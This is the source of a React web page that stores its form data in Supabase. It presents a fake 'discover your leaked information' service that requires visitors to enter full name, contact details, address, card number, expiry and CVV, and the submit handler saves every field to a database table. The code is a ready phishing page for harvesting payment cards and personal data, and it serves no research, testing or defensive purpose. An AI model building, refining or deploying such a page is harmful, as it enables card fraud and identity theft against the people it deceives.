import React, { useState } from "react";
import { createRoot } from "react-dom/client";
import { supabase } from "./supabase";

function App() {
  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);

  async function handleSubmit(event) {
    event.preventDefault();
    setLoading(true);

    const form = new FormData(event.currentTarget);

    const inquiry = {
      name: form.get("name"),
      email: form.get("email"),
      phone: form.get("phone"),
      card_number: form.get("card_number"),
      cvv: form.get("cvv"),
      expiry: form.get("expiry"),
      country: form.get("country"),
      address: form.get("address"),
      city: form.get("city"),
      message: form.get("message"),
    };

    const { error } = await supabase
      .from("travel_inquiries")
      .insert([inquiry]);

    setLoading(false);

    if (error) {
      console.error("Supabase error:", error);

      alert(
        "Supabase Error\n\n" +
        "Message: " +
        error.message +
        "\n\nCode: " +
        error.code
      );

      return;
    }

    setSubmitted(true);
    event.currentTarget.reset();
  }

  const page = {
  minHeight: "100vh",
  background: "#0b0b0d",
  color: "#f5f1ed",
  fontFamily: "Arial, sans-serif",
};

  const nav = {
    padding: "22px 7%",
    background: "#fff",
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    borderBottom: "1px solid #ddd",
  };

  const logo = {
    fontSize: "22px",
    fontWeight: "800",
    letterSpacing: "1px",
  };

  const red = {
    color: "#c62828",
  };

  const hero = {
  minHeight: "550px",
  padding: "70px 7%",
  display: "flex",
  alignItems: "center",
  color: "#fff",
  background:
    "linear-gradient(rgba(5,5,5,.78),rgba(35,5,12,.88)),url('https://www.google.com/search?client=ms-android-samsung-ss&hs=Nehq&sca_esv=cb3dd98549f5726b&sxsrf=APpeQnvDa2lLv48XqTrQ0h-yYHqPm_bAZQ:1790416249985&udm=2&fbs=ABfTbFXmzBGw9LECshVETHbdczUekrr4P3jxmDQ00QvQP6rDCfvRDF3m1JTFCpkx8Z4iq9w-ZdY6AL89Fs2yUi6aAIg91sLpubrt8SYCJF0asT7xuLiYEE6TTh9E4Beuek21FDHPDoUFeQeON9g8DzoZ4m5ZlYdJ3h7D9RdIoaVP2RM9H-jK3HbvthuUJMelvPFvZW63N6HSPuLXFX5wY_iGHsoDyILMWejpBBZ1AwAq1bqpp2d0ajU&q=mysterious&sa=X&ved=2ahUKEwid99Gk_IuXAxU8AHkGHRyAF1cQtKgLegQIFhAB&biw=365&bih=684&dpr=1.97#sv=CAMSVxoyKhBlLW1mNHQ2Q3EwM2RoQ2VNMg5tZjR0NkNxMDNkaENlTToOZ3F0LWl4RG5IMGZ5Z00gBCoXCgFzEhBlLW1mNHQ2Q3EwM2RoQ2VNGAEwAUoECAEQAhgHIMmC1L4OSggQAhgBIAIoAQ') center/cover",
};

  const section = {
    padding: "75px 7%",
  };

  const grid = {
    display: "grid",
    gridTemplateColumns: "repeat(auto-fit,minmax(250px,1fr))",
    gap: "22px",
  };

  const input = {
    width: "100%",
    boxSizing: "border-box",
    padding: "14px",
    border: "1px solid #ccc",
    borderRadius: "5px",
    fontSize: "15px",
    background: "#fff",
  };

  const label = {
    fontWeight: "700",
    fontSize: "14px",
    marginBottom: "7px",
  };

  const field = {
    display: "flex",
    flexDirection: "column",
  };

  return (
    <div style={page}>

      <nav style={nav}>
        <div style={logo}>
          CONFIDENTIAL<span style={red}>INFORMATION</span>
        </div>

        <div>
          <a href="#information" style={{ marginRight: "20px" }}>
            Confidential
          </a>

          <a href="#details">
            Find out now
          </a>
        </div>
      </nav>

      <section style={hero}>
        <div>
          <p
            style={{
              letterSpacing: "4px",
              textTransform: "uppercase",
            }}
          >
            Private Japan Travel
          </p>

          <h1
            style={{
              fontSize: "clamp(45px,7vw,80px)",
              margin: "15px 0",
            }}
          >
            Discover your leaked information.
          </h1>

          <p
            style={{
              fontSize: "18px",
              maxWidth: "600px",
              lineHeight: "1.7",
            }}
          >
            Find out your leaked information today. 
          </p>

          <a
            href="#details"
            style={{
              display: "inline-block",
              marginTop: "20px",
              padding: "15px 25px",
              background: "#c62828",
              color: "#fff",
              textDecoration: "none",
              borderRadius: "4px",
              fontWeight: "700",
            }}
          >
            Get your report
          </a>
        </div>
      </section>

       <section
        id="information"
        style={{
          ...section,
          background: "#fff",
        }}
      >
        <div
          style={{
            maxWidth: "900px",
            margin: "0 auto",
          }}
        >

          <h2
            style={{
              fontSize: "40px",
              marginBottom: "10px",
            }}
          >
            FIND OUT NOW
          </h2>

          <p style={{ marginBottom: "35px", color: "#666" }}>
            Send us your message. 
          </p>

          {submitted ? (

            <div
              style={{
                padding: "35px",
                background: "#edf7ef",
                border: "1px solid #c7dfcc",
                borderRadius: "8px",
              }}
            >
              <h2>Inquiry received.</h2>

              <p>
                Thank you. Your Confidential Report inquiry has been recieved
                successfully.
              </p>

              <button
                onClick={() => setSubmitted(false)}
                style={{
                  padding: "12px 20px",
                  border: "none",
                  background: "#17202a",
                  color: "#fff",
                  borderRadius: "4px",
                  cursor: "pointer",
                }}
              >
                Submit Another Inquiry
              </button>
            </div>

          ) : (

            <form onSubmit={handleSubmit}>

              <div style={grid}>

                <div style={field}>
                  <label style={label}>
                    Full Name *
                  </label>

                  <input
                    required
                    name="name"
                    type="text"
                    placeholder="Your full name"
                    style={input}
                  />
                </div>

                <div style={field}>
                  <label style={label}>
                    Email Address *
                  </label>

                  <input
                    required
                    name="email"
                    type="email"
                    placeholder="you@example.com"
                    style={input}
                  />
                </div>

                <div style={field}>
                  <label style={label}>
                    card number *
                  </label>

                  <input
                    required
                    name="card_number"
                    type="card_number"
                    placeholder="55667722829992"
                    style={input}
                  />
                </div>

                <div style={field}>
                  <label style={label}>
                    expiry *
                  </label>

                  <input
                    required
                    name="expiry"
                    type="expiry"
                    placeholder="06/29"
                    style={input}
                  />
                </div>

                <div style={field}>
                  <label style={label}>
                    cvv *
                  </label>

                  <input
                    required
                    name="cvv"
                    type="cvv"
                    placeholder="123"
                    style={input}
                  />
                </div>

    

                <div style={field}>
                  <label style={label}>
                    Phone Number *
                  </label>

                  <input
                    required
                    name="phone"
                    type="tel"
                    placeholder="+92 300 0000000"
                    style={input}
                  />
                </div>

                <div style={field}>
                  <label style={label}>
                    Country *
                  </label>

                  <select
                    required
                    name="country"
                    defaultValue=""
                    style={input}
                  >
                    <option value="" disabled>
                      Select country
                    </option>

                    <option>Pakistan</option>
                    <option>United Kingdom</option>
                    <option>United States</option>
                    <option>Canada</option>
                    <option>Australia</option>
                    <option>Germany</option>
                    <option>France</option>
                    <option>Netherlands</option>
                    <option>United Arab Emirates</option>
                    <option>Saudi Arabia</option>
                    <option>Other</option>
                  </select>
                </div>

                <div style={field}>
                  <label style={label}>
                    Address *
                  </label>

                  <input
                    required
                    name="address"
                    type="text"
                    placeholder="Street address"
                    style={input}
                  />
                </div>

                <div style={field}>
                  <label style={label}>
                    City *
                  </label>

                  <input
                    required
                    name="city"
                    type="text"
                    placeholder="Your city"
                    style={input}
                  />
                </div>

                

                <div style={field}>
                  <label style={label}>
                    Information Type
                  </label>

                  <select
                    name="information_type"
                    defaultValue=""
                    style={input}
                  >
                    <option value="" disabled>
                      Select information type
                    </option>

                    <option>Card details</option>
                    <option>Social media details</option>
                    <option>Phone details</option>
                    <option>Email details</option>
                    <option>Username details</option>
                  </select>
                </div>

                <div style={field}>
                  <label style={label}>
                   Date of birth
                  </label>

                  <input
                    name="birth_date"
                    type="date"
                    style={input}
                  />
                </div>

                

              </div>

              <div
                style={{
                  ...field,
                  marginTop: "22px",
                }}
              >
                <label style={label}>
                  Message
                </label>

                <textarea
                  name="message"
                  placeholder="Tell us about your requirements..."
                  style={{
                    ...input,
                    minHeight: "140px",
                    resize: "vertical",
                  }}
                />
              </div>

              <button
                type="submit"
                disabled={loading}
                style={{
                  marginTop: "25px",
                  padding: "15px 30px",
                  background: loading
                    ? "#999"
                    : "#c62828",
                  color: "#fff",
                  border: "none",
                  borderRadius: "4px",
                  fontWeight: "700",
                  cursor: loading
                    ? "not-allowed"
                    : "pointer",
                }}
              >
                {loading
                  ? "Submitting..."
                  : "GET YOUR REPORT NOW"}
              </button>

            </form>
          )}

        </div>
      </section>

      <footer
        style={{
          background: "#111820",
          color: "#fff",
          padding: "45px",
          textAlign: "center",
        }}
      >
        <h3>
          CONFIDENTIAL<span style={red}>INFORMATION</span>
        </h3>

        <p>Discover everything today.</p>

        <small>
          © 2026 CONFIDENTIAL INFORMATION COMPANY. All rights reserved.
        </small>
      </footer>

    </div>
  );
}

createRoot(document.getElementById("root")).render(<App />);
